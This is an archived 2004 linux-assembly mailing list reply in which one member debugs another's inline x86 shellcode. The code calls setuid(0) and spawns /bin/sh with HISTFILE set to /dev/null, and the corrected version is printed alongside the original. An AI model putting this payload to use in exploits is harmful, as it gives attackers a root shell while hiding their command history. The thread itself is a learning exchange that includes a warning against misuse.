From: Frederic Marmond <fmarmond@eprocess.fr>
Subject: Re: execve with env..
Date: Fri, 28 May 2004 10:54:48 +0200
Sender: linux-assembly-owner@vger.kernel.org
Message-ID: <40B6FE58.4030405@eprocess.fr>
References: <20040527210502.96393.qmail@web90105.mail.scd.yahoo.com>
Reply-To: fmarmond@eprocess.fr
Mime-Version: 1.0
Content-Transfer-Encoding: 7bit
Return-path: <linux-assembly-owner@vger.kernel.org>
In-Reply-To: <20040527210502.96393.qmail@web90105.mail.scd.yahoo.com>
List-Id: <linux-assembly.vger.kernel.org>
Content-Type: text/plain; charset="us-ascii"; format="flowed"
To: Danett song <danett18@yahoo.com.br>
Cc: linux-assembly@vger.kernel.org

Hi Danett,

I finally had time to have a look at your code.

1rst: the translations (heaxa -> ascii) you gave were wrong. If you play 
with assembly, you have to be rigourous and well document your code.
2nd : have a look at 
http://www.linuxfocus.org/English/March2001/article183.shtml (many 
langage translations available), as it may gives you informations about 
what you seem to want to do.
3rd: have a look at the code. I've modified some lines (my tag is 'FMD')
FMD~   => I changed this line
FMD+   => I added this line
FMD-   => I removed this line

__asm__(
        "xor %eax, %eax   \n"  // set 0 to %eax
        "xor %ebx, %ebx   \n"  // 1 arg setuid (zero)
        "mov $0x17, %al   \n"  // call setuid
        "int $0x80        \n"  // kernel mode
        "xor  %eax,%eax   \n"  // set 0 to %eax
        "push %eax        \n"  // put zero at stack
        "push $0x68732F2F \n"  // FMD~: hs//
        "push $0x6E69622F \n"  // FMD~: nib/
                               // FMD+: FALSE "put /bin//bash at stack"
                               // FMD+: it is not "bash", but "sh" you 
give as parameter.
                               // FMD+: it's not a problem, but please, 
next time, make right comments!
        "mov  %esp,%ebx   \n"  // Copy 1arg execve
        "push %eax        \n"  // put zero at stack
        "push %ebx        \n"  // put %ebx at stack
        "mov  %esp, %ecx  \n"  // Copy 2arg execve
        "xor  %edx, %edx  \n"  // set 0 to %edx
        "push %eax      \n"    //FMD+: you've forgot this line
        "push $0x6C6C756E \n"  // FMD~:    llun
        "push $0x2F2F7665 \n"  // FMD~:    //ve
        "push $0x642F2F3D \n"  // FMD~:    d//=
        "push $0x454C4946 \n"  // FMD~:    ELIF   
//      "push $0x54534949 \n"  // FMD-:    TSII
      "push $0x54534948 \n"    // FMD+:    TSIH
                               // FMD+: FALSE: "HISTFILE=//dev//null"
                               // FMD+: wrong hexa code, you wrote 
"IISTFILE=...", instead of "HISTFILE=..."
        "mov  %esp, %edx  \n"  // FMD+: back up the string pointer
        "push %eax        \n"  // put zero at stack
        "push %edx      \n"    // FMD+: put the env string here in stack
        "mov  %esp, %edx  \n"  // copy 3arg execve
        "mov  $0x0b, %al \n"   // call execve
        "int  $0x80      \n"   // kernel mode
        "xor  %eax,%eax  \n"   // 1arg of exit (zero)
        "mov  $0x01,%al  \n"   // call exit
        "int  $0x80      \n"   // kernel mode
      );

As you can see, few typo errors in your comments and hexa strings.
But the most important is that you have to pass 3rd argument to execve 
exactly as for its 2nd. (char* []).

I hope your intention is not to hack someone else system, and that you 
play with that only for learning purpose...
Keep in mind there are always someone (stronger than you and than me) 
that may catch you if you pirate something...

If you have another question, feel free to ask! ;)

Fred


Danett song wrote:

>Hi fmarmond,
>
>  
>
>>I have no time today, but I'll try to help you
>>tomorow. 
>>    
>>
>
>Thkz a lot! :)
>
>  
>
>>Can you provide a commented version of your code? 
>>    
>>
>
>Yah, look below...
>
>#include <stdio.h> 
>  
>int main(){ 
>  
>__asm__( 
>        "xor %eax, %eax   \n"  // set 0 to %eax
>        "xor %ebx, %ebx   \n"  // 1 arg setuid (zero)
>        "mov $0x17, %al   \n"  // call setuid
>        "int $0x80        \n"  // kernel mode
>        "xor  %eax,%eax   \n"  // set 0 to %eax
>        "push %eax        \n"  // put zero at stack
>        "push $0x68732F2F \n"  
>        "push $0x6E69622F \n"  // put /bin//bash at
>stack
>        "mov  %esp,%ebx   \n"  // Copy 1arg execve
>        "push %eax        \n"  // put zero at stack
>        "push %ebx        \n"  // put %ebx at stack
>        "mov  %esp, %ecx  \n"  // Copy 2arg execve
>        "xor  %edx, %edx  \n"  // set 0 to %edx
>        "push $0x6C6C756E \n"  
>        "push $0x2F2F7665 \n" 
>        "push $0x642F2F3D \n" 
>        "push $0x454C4946 \n" 
>        "push $0x54534948 \n"  // HISTFILE=//dev//null
>        "push %eax        \n"  // put zero at stack
>        "mov  %esp, %edx  \n"  // copy 3arg execve
>        "mov  $0x0b, %al \n"   // call execve
>        "int  $0x80      \n"   // kernel mode
>        "xor  %eax,%eax  \n"   // 1arg of exit (zero)
>        "mov  $0x01,%al  \n"   // call exit
>        "int  $0x80      \n"   // kernel mode
>      ); 
>  
>return(0); 
>} 
>
>Thkz,
>
>______________________________________________________________________
>
>Participe da pesquisa global sobre o Yahoo! Mail: 
>http://br.surveys.yahoo.com/global_mail_survey_br
>
>  
>

